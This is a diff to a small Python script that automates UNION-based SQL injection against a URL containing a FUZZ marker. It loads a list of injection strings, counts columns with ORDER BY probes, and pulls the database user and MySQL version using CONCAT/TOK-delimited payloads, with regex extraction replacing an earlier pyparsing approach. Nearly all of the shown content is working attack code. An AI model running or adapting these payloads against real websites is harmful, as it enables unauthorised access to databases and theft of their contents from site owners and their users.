@@ -3,7 +3,6 @@ from threading import Thread
 import sys
 from termcolor import colored
 import getopt
-from pyparsing import Word, Combine, alphas
 import re
 
 def banner():
@@ -32,20 +31,22 @@ def start(argv):
         print("Error en arguments")
         sys.exit()
 
-    for opt, arg in opts:
+    for opt,arg in opts:
         if opt == '-w':
             url = arg
         elif opt == '-i':
             dictio = arg
 
     try:
+       print('Opening injections file: ' + dictio)
        f = open(dictio, "r")
-       injects = f.read().splitlines()
+       name = f.read().splitlines()
     except:
         print("Failed opening file: " + dictio)
         sys.exit()
 
-    launcher(url, injects)
+    launcher(url, name)
+
 
 def launcher(url, diction):
     injected = []
@@ -67,8 +68,8 @@ def launcher(url, diction):
     [print(name) for name in detect_columns_names(url)]
 
     username = detect_user(url)
-    print(username)
-    print(detect_version(url))
+    print('\nUsername is:\n' + username)
+    print('\nVersion is:\n' + detect_version(url))
 
 def detect_columns(url):
     new_url = url.replace('FUZZ', "' order by X-- -")
@@ -109,18 +110,18 @@ def injector(injected):
     return results
 
 def detect_user(url):
-    new_url = url.replace("FUZZ","-1'union select 1,user()-- -")
+    new_url = url.replace("FUZZ","-1'union select 1,CONCAT('TOK',user(),'TOK')-- -")
     req = requests.get(new_url)
-    name = Combine(Word(alphas) +"@" + Word(alphas))
-    pars_result = name('username').parseString(req.text)
-    return pars_result.username
+    search_pattern = "TOK([a-zA-Z0-9].+?)TOK+?"
+
+    return re.search(search_pattern,req.text).group(1)
 
 def detect_version(url):
-    new_url=url.replace("FUZZ", "-1'union select test,concat('TOK',@@version,'TOK')")
-    search_pattern = "TOK([a-zA-Z0-9].+?)TOK+?"
+    new_url=url.replace("FUZZ", "-1'union select 1,concat('TOK',@@version,'TOK')-- -")
+    search_pattern = re.compile('TOK([a-zA-Z0-9].+?)TOK+?')
     req = requests.get(new_url)
-    version = re.search(search_pattern,req.text)
-    return version[0]
+    version = search_pattern.search(req.text)
+    return version[1] #эквивалентно version.group(1) одни скобки-одна группа. Групппой убираем TOK TOK
 
 if __name__ == "__main__":
     try:
